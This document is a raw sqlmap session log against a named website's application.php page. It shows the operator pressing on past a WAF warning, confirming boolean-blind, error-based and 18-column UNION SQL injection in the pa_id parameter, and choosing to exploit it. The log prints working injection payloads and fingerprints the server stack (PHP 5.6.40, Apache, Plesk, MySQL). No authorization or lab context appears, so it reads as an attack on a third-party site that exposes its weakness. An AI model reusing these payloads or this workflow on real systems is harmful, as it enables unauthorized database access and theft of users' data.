URL 5:
GET https://www.anypower-mit.com/application.php?pa_id=2
do you want to test this URL? [Y/n/q]
> y
[22:37:07] [INFO] testing URL 'https://www.anypower-mit.com/application.php?pa_id=2'
[22:37:08] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=5lid0f1uk5j...ds7sg506k1'). Do you want to use those [Y/n] y
[22:37:13] [INFO] checking if the target is protected by some kind of WAF/IPS
[22:37:17] [WARNING] reflective value(s) found and filtering out
[22:37:17] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS
are you sure that you want to continue with further target testing? [Y/n] y
[22:37:19] [WARNING] please consider usage of tamper scripts (option '--tamper')
[22:37:19] [INFO] testing if the target URL content is stable
[22:37:21] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] y
[22:37:22] [INFO] testing if GET parameter 'pa_id' is dynamic
[22:37:25] [WARNING] GET parameter 'pa_id' does not appear to be dynamic
[22:37:28] [WARNING] heuristic (basic) test shows that GET parameter 'pa_id' might not be injectable
[22:37:29] [INFO] testing for SQL injection on GET parameter 'pa_id'
[22:37:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[22:39:17] [INFO] GET parameter 'pa_id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[22:40:20] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[22:42:12] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[22:42:14] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
y
[22:42:18] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[22:42:19] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[22:42:21] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[22:42:22] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[22:42:53] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[22:43:04] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[22:43:06] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[22:43:10] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[22:43:13] [INFO] GET parameter 'pa_id' is 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[22:43:13] [INFO] testing 'Generic inline queries'
[22:43:15] [INFO] testing 'MySQL inline queries'
[22:43:16] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[22:43:16] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
[22:43:56] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[22:43:58] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[22:43:59] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[22:44:11] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[22:44:13] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[22:44:20] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[22:44:27] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[22:44:37] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[22:44:45] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[22:45:09] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[22:45:15] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[22:45:36] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[22:45:42] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[22:45:48] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query)'
[22:45:50] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (heavy query)'
[22:45:55] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query - comment)'
[22:45:58] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (heavy query - comment)'
[22:46:04] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[22:46:30] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
[22:46:57] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[22:47:03] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
[22:47:09] [INFO] testing 'MySQL AND time-based blind (ELT)'
[22:47:20] [INFO] testing 'MySQL OR time-based blind (ELT)'
[22:47:42] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
[22:47:48] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
[22:48:09] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[22:48:11] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[22:48:12] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[22:48:12] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[22:48:12] [INFO] testing 'MySQL < 5.0.12 time-based blind - Parameter replace (heavy queries)'
[22:48:12] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
[22:48:12] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
[22:48:12] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
[22:48:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[22:48:12] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[22:48:16] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[22:48:46] [INFO] target URL appears to have 18 columns in query
[22:51:23] [INFO] GET parameter 'pa_id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'pa_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 126 HTTP(s) requests:
---
Parameter: pa_id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: pa_id=2' AND 5408=5408 AND 'IPng'='IPng

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: pa_id=2' OR (SELECT 4545 FROM(SELECT COUNT(*),CONCAT(0x7162767671,(SELECT (ELT(4545=4545,1))),0x716b6a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'ILmh'='ILmh

    Type: UNION query
    Title: Generic UNION query (NULL) - 18 columns
    Payload: pa_id=-3687' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7162767671,0x6c597675794a594468515a6d437151414b63626a68576862586f4b4c4b7555554a64694345627754,0x716b6a7171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
---
do you want to exploit this SQL injection? [Y/n] y
[22:52:04] [INFO] the back-end DBMS is MySQL
web server operating system: Linux
web application technology: Apache, PHP, Plesk, PHP 5.6.40
back-end DBMS: MySQL >= 5.0
[22:52:11] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 1 times, 404 (Not Found) - 59 times